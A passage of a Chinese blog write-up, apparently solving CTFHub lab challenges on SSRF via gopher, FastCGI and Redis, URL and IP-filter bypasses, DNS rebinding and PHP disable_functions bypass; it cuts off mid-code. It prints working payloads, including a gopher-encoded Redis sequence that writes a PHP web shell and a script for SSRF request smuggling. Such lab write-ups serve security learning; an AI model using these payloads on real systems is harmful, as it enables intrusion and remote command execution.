class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;upload&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://upyun.wuuconix.link/image-20210910173005459.png" alt="模拟 抓包" /></p><p>然后删除不必要的字段，保留<code>Host</code>,<code>Content-Length</code>,<code>Content-Type</code>以及第一行的POST请求，注意对Host进行修改，修改成内网。得到以下POC。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote<br><br>payload = \<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">POST /flag.php HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1:80</span><br><span class="hljs-string">Content-Type: multipart/form-data; boundary=---------------------------73242662227339777571999664765</span><br><span class="hljs-string">Content-Length: 221</span><br><span class="hljs-string"></span><br><span class="hljs-string">-----------------------------73242662227339777571999664765</span><br><span class="hljs-string">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;upload.txt&quot;</span><br><span class="hljs-string">Content-Type: text/plain</span><br><span class="hljs-string"></span><br><span class="hljs-string">1</span><br><span class="hljs-string">-----------------------------73242662227339777571999664765--</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>payload = quote(payload)<br>payload = payload.replace(<span class="hljs-string">&quot;%0A&quot;</span>, <span class="hljs-string">&quot;%0D%0A&quot;</span>)<br>payload = <span class="hljs-string">f&quot;gopher://127.0.0.1:80/_<span class="hljs-subst">&#123;quote(payload)&#125;</span>&quot;</span><br><span class="hljs-built_in">print</span>(payload)<br></code></pre></td></tr></table></figure><p>运行后可以生成以下gopher协议数据包。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">gopher</span>://<span class="hljs-number">127.0.0.1:80</span>/_%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>APOST%<span class="hljs-number">2520</span>/flag.php%<span class="hljs-number">2520</span>HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>AHost%<span class="hljs-number">253</span>A%<span class="hljs-number">2520127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>%<span class="hljs-number">253</span>A80%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>AContent-Type%<span class="hljs-number">253</span>A%<span class="hljs-number">2520</span>multipart/form-data%<span class="hljs-number">253</span>B%<span class="hljs-number">2520</span>boundary%<span class="hljs-number">253</span>D---------------------------<span class="hljs-number">73242662227339777571999664765</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>AContent-Length%<span class="hljs-number">253</span>A%<span class="hljs-number">2520221</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A-----------------------------<span class="hljs-number">73242662227339777571999664765</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>AContent-Disposition%<span class="hljs-number">253</span>A%<span class="hljs-number">2520</span>form-data%<span class="hljs-number">253</span>B%<span class="hljs-number">2520</span>name%<span class="hljs-number">253</span>D%<span class="hljs-number">2522</span>file%<span class="hljs-number">2522</span>%<span class="hljs-number">253</span>B%<span class="hljs-number">2520</span>filename%<span class="hljs-number">253</span>D%<span class="hljs-number">2522</span>upload.txt%<span class="hljs-number">2522</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>AContent-Type%<span class="hljs-number">253</span>A%<span class="hljs-number">2520</span>text/plain%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A1%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A-----------------------------<span class="hljs-number">73242662227339777571999664765</span>--%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A<br></code></pre></td></tr></table></figure><p>之后把这一串放在url参数里发送就可以得到flag啦！</p><p><img src="https://upyun.wuuconix.link/image-20210910173257456.png" alt="ctf" /></p><p>这里需要注意一点，我试了一下把Host写成<code>http://127.0.0.1:80</code>，无法得到flag。必须是规范的<code>ip:port</code>格式。</p><p>这类题只要了解了gopher协议本质上都差不多。</p><h3 id="fastcgi协议"><a class="markdownIt-Anchor" href="#fastcgi协议"></a> FastCGI协议</h3><p>CGI 即 <code>Common Gateway Interface</code> 通用网关接口。php里常见到的fpm就是<code>FastCGI Process Interface</code> FastCGI进行管理器 的缩写。其作用就是让php作为一个外部拓展应用去与http服务器进行联系。</p><p>这道题就是让我们利用那个url参数发送gopher数据包来和在内网9000端口上的fastcgi建立联系，让它执行某种命令。</p><p>大致思路就是在fastcgi协议中加入两个重要的配置。</p><blockquote><p>auto_prepend_file = php://input<br />allow_url_include = On</p></blockquote><p><code>auto_prepend_file</code>会在所有的phpwe文件顶部加载文件。这里加载的是<code>php://input</code>，相当于把我们传递的php语句放在文件顶部从而实现任意命令执行。</p><p>当然<code>php://input</code>需要开启<code>allow_url_include</code>才能生效。</p><p>这道题看了wp后了解到一个挺好用的脚本，能够直接生成gopher报文。<a href="https://github.com/tarunkant/Gopherus">tarunkant/Gopherus</a></p><p>是用python2编写的，用起来十分简单。输入一个可用的php文件以及你想执行的命令即可。</p><p><img src="https://upyun.wuuconix.link/image-20210910185123554.png" alt="gopherus" /></p><p>它产生的gopher报文里内部的请求已经url编码了，但是我们把这个传递给题目的时候还需要再一次url编码。</p><p><img src="https://upyun.wuuconix.link/image-20210910185322316.png" alt="ctf" /></p><h3 id="redis协议"><a class="markdownIt-Anchor" href="#redis协议"></a> Redis协议</h3><p>昨天下载的<code>Gopherus</code>工具里就有Redis的payload2333。它的默认paylaod是这样的。</p><p><img src="https://upyun.wuuconix.link/image-20210911234715662.png" alt="redis" /></p><p>把它的paylaod url解码一下，结果是这样的。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs bash">gopher://127.0.0.1:6379/_*1<br><span class="hljs-variable">$8</span><br>flushall<br>*3<br><span class="hljs-variable">$3</span><br><span class="hljs-built_in">set</span><br><span class="hljs-variable">$1</span><br>1<br><span class="hljs-variable">$34</span><br><br><br>&lt;?php system(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]); ?&gt;<br><br><br>*4<br><span class="hljs-variable">$6</span><br>config<br><span class="hljs-variable">$3</span><br><span class="hljs-built_in">set</span><br><span class="hljs-variable">$3</span><br><span class="hljs-built_in">dir</span><br><span class="hljs-variable">$13</span><br>/var/www/html<br>*4<br><span class="hljs-variable">$6</span><br>config<br><span class="hljs-variable">$3</span><br><span class="hljs-built_in">set</span><br><span class="hljs-variable">$10</span><br>dbfilename<br><span class="hljs-variable">$9</span><br>shell.php<br>*1<br><span class="hljs-variable">$4</span><br>save<br></code></pre></td></tr></table></figure><p>其中的<code>*</code>大概指的是接下去管的变量的个数，<code>$</code>后面跟的数是后面变量字符串的长度。</p><p>我们仔细观察它给出的payload可以观察到它的换行已经是<code>%0D%0A</code>了，所以这也就是昨天Fastcgi协议没有变换行就能直接ctf的原因。</p><p>所以今天这个也只要把它给的payload再经过一次url编码就是最终的payload了。</p><p>可以直接在burp里面进行变换。<code>右键-&gt; Convert Selection-&gt; URL-&gt; URLencode key characters</code>即可实现把选中部分进行url编码。</p><p>然后我可以看看<code>shell.php</code>是否写入。</p><p><img src="https://upyun.wuuconix.link/image-20210911235411166.png" alt="shell" /></p><p>但是可能由于有一些多余数据的原因，导致蚁剑没法连接，但是无伤大雅，直接手动命令执行即可。</p><p><img src="https://upyun.wuuconix.link/image-20210911235458809.png" alt="ls" /></p><p><img src="https://upyun.wuuconix.link/image-20210911235508129.png" alt="ls /" /></p><p><img src="https://upyun.wuuconix.link/image-20210911235516858.png" alt="cat /flag" /></p><h3 id="url-bypass"><a class="markdownIt-Anchor" href="#url-bypass"></a> URL Bypass</h3><p><img src="https://upyun.wuuconix.link/image-20210912203035512.png" alt="题目" /></p><p>题目提示必须以某个网站作为开始，但是我们的目标肯定是127.0.0.1，那怎么办呢？</p><p>查询过资料后发现url中有个神奇的字符<code>@</code>。使用过后，前面的网站直接失效，而去访问后面的网站。</p><p>这里直接能访问到我的博客2333。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://challenge-<span class="hljs-number">1</span>abe55a5f7cb9ddc.sandbox.ctfhub.com:<span class="hljs-number">10800</span>/?url=http://notfound.ctfhub.com@wuuconix.link:<span class="hljs-number">8000</span><br></code></pre></td></tr></table></figure><p><img src="https://upyun.wuuconix.link/image-20210912203203810.png" alt="test" /></p><p>payload</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>challenge-<span class="hljs-number">1</span>abe55a5f7cb9ddc.sandbox.ctfhub.com:<span class="hljs-number">10800</span><span class="hljs-regexp">/?url=http:/</span><span class="hljs-regexp">/notfound.ctfhub.com@127.0.0.1/</span>flag.php<br></code></pre></td></tr></table></figure><p><img src="https://upyun.wuuconix.link/image-20210912203313048.png" alt="ctf" /></p><h3 id="数字ip-bypass"><a class="markdownIt-Anchor" href="#数字ip-bypass"></a> 数字IP Bypass</h3><p><img src="https://upyun.wuuconix.link/image-20210912204028892.png" alt="过滤" /></p><p>一开始提示过滤了<code>127</code>，<code>172</code>和<code>@</code>。查看资料后发现有很多ip有很多其他的形态，这里摘抄一下。</p><blockquote><p>例如192.168.0.1<br />(1)、8进制格式：0300.0250.0.1<br />(2)、16进制格式：0xC0.0xA8.0.1<br />(3)、10进制整数格式：3232235521<br />(4)、16进制整数格式：0xC0A80001</p><p>还有一种特殊的省略模式，例如10.0.0.1这个IP可以写成10.1</p><ol><li><a href="http://0/">http://0/</a></li><li><a href="http://127.1/">http://127.1/</a></li><li>利用ipv6绕过，http://[::1]/</li><li><a href="http://127.0.0.1">http://127.0.0.1</a>./</li></ol></blockquote><p>我便尝试了一下八进制的127.0.01。</p><p><img src="https://upyun.wuuconix.link/image-20210912204358718.png" alt="过滤." /></p><p>结果又说过滤<code>.</code>了，佛了，那就再试试整数。</p><p><img src="https://upyun.wuuconix.link/image-20210912204435718.png" alt="127.0.0.1的整数形式" /></p><p><img src="https://upyun.wuuconix.link/image-20210912204512250.png" alt="2130706433" /></p><p><img src="https://upyun.wuuconix.link/image-20210912204543629.png" alt="0x7f000001" /></p><p>成功得到flag。</p><h3 id="302跳转-bypass"><a class="markdownIt-Anchor" href="#302跳转-bypass"></a> 302跳转 Bypass</h3><p>这道题出的十分不严谨，以下是它的<code>index.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php">?php<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;url&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: /?url=_&quot;</span>);<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><span class="hljs-variable">$url</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/127|172|10|192/&quot;</span>, <span class="hljs-variable">$url</span>)) &#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;hacker! Ban Intranet IP&quot;</span>);<br>&#125;<br><span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>();<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="hljs-number">1</span>);<br><span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br></code></pre></td></tr></table></figure><p>只是对ip做了最简单的过滤 ，这就导致上道题的payload完全试用。</p><p><img src="https://upyun.wuuconix.link/image-20210912210819518.png" alt="payload" /></p><p>看了其他人的wp后还发现一个很好用的payload。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?url=http:<span class="hljs-regexp">//</span>localhost/flag.php<br></code></pre></td></tr></table></figure><p>那看题目名字是要让我们302跳转,那需要怎么做呢？</p><p>看网上的都是用的短域名服务来实现跳转，武丑兄作为拥有两个域名的大佬当然要自己写啦！</p><p>设置了一个二级域名<code>302.wuuconix.link</code>然后用nginx rewrite到<code>http://127.0.0.1/flag.php</code>上。</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span><br>&#123;<br>   <span class="hljs-attribute">listen</span> <span class="hljs-number">443</span> ssl;<span class="hljs-comment"># https 监听的是 443端口</span><br>   <span class="hljs-attribute">server_name</span>  <span class="hljs-number">302</span>.wuuconix.link;<br> <br>   <span class="hljs-attribute">keepalive_timeout</span> <span class="hljs-number">100</span>;<br> <br>   <span class="hljs-attribute">ssl_session_cache</span>   shared:SSL:<span class="hljs-number">10m</span>;<br>   <span class="hljs-attribute">ssl_session_timeout</span> <span class="hljs-number">10m</span>;<br> <br>   <span class="hljs-attribute">ssl_certificate</span> /etc/nginx/ssl-link/fullchain.crt; <span class="hljs-comment"># 证书路径</span><br>   <span class="hljs-attribute">ssl_certificate_key</span> /etc/nginx/ssl-link/private.pem; <span class="hljs-comment"># 请求认证 key 的路径</span><br><br>   <span class="hljs-attribute">ssl_protocols</span> TLSv1.<span class="hljs-number">1</span> TLSv1.<span class="hljs-number">2</span>;<br>   <span class="hljs-attribute">ssl_ciphers</span> ECDHE-RSA-AES128-GCM-SHA256:HIGH:!aNULL:!MD5:!RC4:!DHE;<br>   <span class="hljs-attribute">ssl_prefer_server_ciphers</span> <span class="hljs-literal">on</span>;<br>   <span class="hljs-attribute">ssl_session_cache</span> shared:SSL:<span class="hljs-number">10m</span>;<br>   <br>   <span class="hljs-attribute">rewrite</span><span class="hljs-regexp"> ^(.*)</span> http://127.0.0.1/flag.php <span class="hljs-literal">permanent</span>;<br>&#125;<br><br><span class="hljs-section">server</span><br>&#123;<br>   <span class="hljs-attribute">listen</span> <span class="hljs-number">80</span>;<br>   <span class="hljs-attribute">server_name</span>  <span class="hljs-number">302</span>.wuuconix.link;<br>   <span class="hljs-attribute">rewrite</span><span class="hljs-regexp"> ^(.*)</span> https://<span class="hljs-variable">$server_name</span><span class="hljs-variable">$1</span> <span class="hljs-literal">permanent</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>其实只监听80端口然后rewrite就行，但是我的服务器都用了ssl证书，把上面443的端口监听删掉会出现莫名的错误，就保留啦，也就是多做了一次302跳转，最后的目的地是一致的2333。</p><p><img src="https://upyun.wuuconix.link/image-20210912212451057.png" alt="flag" /></p><p>成功得到flag。</p><h3 id="dns重绑定-bypass"><a class="markdownIt-Anchor" href="#dns重绑定-bypass"></a> DNS重绑定 Bypass</h3><p>这道题和上一题不同，感觉应该是http服务设置的原因，明明<code>index.php</code>和<code>flag.php</code>几乎没变。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#view-source:http://challenge-2656dc822cd540bd.sandbox.ctfhub.com:10800/?url=file:///var/www/html/index.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;url&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: /?url=_&quot;</span>);<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><span class="hljs-variable">$url</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/127|172|10|192/&quot;</span>, <span class="hljs-variable">$url</span>)) &#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;hacker! Ban Intranet IP&quot;</span>);<br>&#125;<br><span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>();<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#view-source:http://challenge-2656dc822cd540bd.sandbox.ctfhub.com:10800/?url=file:///var/www/html/flag.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>] != <span class="hljs-string">&quot;127.0.0.1&quot;</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Just View From 127.0.0.1&quot;</span>;<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">getenv</span>(<span class="hljs-string">&quot;CTFHUB&quot;</span>);<br></code></pre></td></tr></table></figure><p>但是前几题的paylaod都失效了。</p><p>不支持302跳转。</p><p><img src="https://upyun.wuuconix.link/image-20210912213511126.png" alt="302 failed" /></p><p><img src="https://upyun.wuuconix.link/image-20210912213605536.png" alt="localhost" /></p><p>这样不知道为什么也不行，按理说这个请求是<code>127.0.0.1</code>的index.php发出的。</p><p>查看资料后了解到DNS重绑定的原理。</p><blockquote><p>在网页浏览过程中，用户在地址栏中输入包含域名的网址。浏览器通过DNS服务器将域名解析为IP地址，然后向对应的IP地址请求资源，最后展现给用户。而对于域名所有者，他可以设置域名所对应的IP地址。当用户第一次访问，解析域名获取一个IP地址；然后，域名持有者修改对应的IP地址；用户再次请求该域名，就会获取一个新的IP地址。对于浏览器来说，整个过程访问的都是同一域名，所以认为是安全的。这就造成了DNS Rebinding攻击。</p></blockquote><p>利用这个网站<a href="https://lock.cmpxchg8b.com/rebinder.html">rbndr.us dns rebinding service (cmpxchg8b.com)</a>来生成一个域名。</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">7f000001</span>.<span class="hljs-number">08080808</span>.rbndr.us<br></code></pre></td></tr></table></figure><p><img src="https://upyun.wuuconix.link/image-20210912214247480.png" alt="ctf" /></p><p>我想了半天这道题哪里体现出必须要DNS重绑定。感觉这道题就是在扯淡。</p><p>为了验证这种想法，我又设置了一个直接指向<code>127.0.0.1</code>的二级域名<code>localhost.wuuconix.link</code></p><p><img src="https://upyun.wuuconix.link/image-20210912214435947.png" alt="localhost.wuuconix.link" /></p><p><img src="https://upyun.wuuconix.link/image-20210912214505804.png" alt="ctf" /></p><p>结果也能获得flag2333。</p><p>只能说这道题出的不好。</p><h2 id="bypass"><a class="markdownIt-Anchor" href="#bypass"></a> Bypass</h2><h3 id="disalbe_functionld_preload"><a class="markdownIt-Anchor" href="#disalbe_functionld_preload"></a> disalbe_function——LD_PRELOAD</h3><p>这道题开局让你连蚁剑，确实能连上，但是点开根目录下的flag是空的。</p><p><img src="https://upyun.wuuconix.link/image-20210914234705422.png" alt="flag幻影" /></p><p>然后我试着在蚁剑的模拟终端里用命令来get flag，但是所有的命令都会返回<code>ret=127</code>。我查了一下，表示命令不可用。我是这样理解的。php一句话木马用get shell，但是这个shell本质上是利用php里面的系统命令实现的，而且用户是<code>www-data</code>。所以出题人可以对一些命令进行限制，但是我还是无法理解，明明蚁剑已经连接了，文件列表都显示出来了，按理说这些文件都是用ls来得到的，但是手动运行ls却不行，那蚁剑是如何得到文件列表的呢？</p><p><img src="https://upyun.wuuconix.link/image-20210914234814297.png" alt="ret=127" /></p><p>这里写出来题目php环境中过滤的函数。</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-built_in">pcntl_alarm,</span>pcntl_fork,pcntl_waitpid,pcntl_wait,<br><span class="hljs-built_in">pcntl_wifexited,</span>pcntl_wifstopped,pcntl_wifsignaled,<br><span class="hljs-built_in">pcntl_wifcontinued,</span>pcntl_wexitstatus,pcntl_wtermsig,<br><span class="hljs-built_in">pcntl_wstopsig,</span>pcntl_signal,pcntl_signal_get_handler,<br><span class="hljs-built_in">pcntl_signal_dispatch,</span>pcntl_get_last_error,pcntl_strerror,<br><span class="hljs-built_in">pcntl_sigprocmask,</span>pcntl_sigwaitinfo,pcntl_sigtimedwait,<br><span class="hljs-built_in">pcntl_exec,</span>pcntl_getpriority,pcntl_setpriority,<br><span class="hljs-built_in">pcntl_async_signals,</span>exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,system<br></code></pre></td></tr></table></figure><p>我们可以看到常用的php命令执行函数<code>system</code>,<code>shell_exec</code>,<code>exec</code>,<code>passthru</code>都被ban了，我十分好奇蚁剑是怎么连接并且获取文件列表的。</p><p>我们暂时先这么理解，蚁剑用了某种神奇的方式得到了文件列表，但是因为cat 文件需要用到 比如<code>system</code>函数，但是这些函数都被ban掉了，所以我们只能看到flag幻影而无法得到flag。</p><p>然后蚁剑插件市场中有个厉害的插件就是专门用来绕过disable_functions的。</p><p><img src="https://upyun.wuuconix.link/image-20210914235445653.png" alt="ant-sword plugins" /></p><p>使用插件过后，html文件夹下 会出现<code>.antproxy.php</code>文件，其内容如下。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_client_header</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-variable">$headers</span>=<span class="hljs-keyword">array</span>();<br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_SERVER</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span>=&gt;<span class="hljs-variable">$v</span>)&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$k</span>,<span class="hljs-string">&#x27;HTTP_&#x27;</span>)===<span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-variable">$k</span>=<span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/^HTTP/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$k</span>));<br>            <span class="hljs-variable">$k</span>=<span class="hljs-title function_ invoke__">preg_replace_callback</span>(<span class="hljs-string">&#x27;/_\w/&#x27;</span>,<span class="hljs-string">&#x27;header_callback&#x27;</span>,<span class="hljs-variable">$k</span>);<br>            <span class="hljs-variable">$k</span>=<span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/^_/&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$k</span>);<br>            <span class="hljs-variable">$k</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;-&#x27;</span>,<span class="hljs-variable">$k</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$k</span>==<span class="hljs-string">&#x27;Host&#x27;</span>) <span class="hljs-keyword">continue</span>;<br>            <span class="hljs-variable">$headers</span>[]=<span class="hljs-string">&quot;<span class="hljs-subst">$k</span>:<span 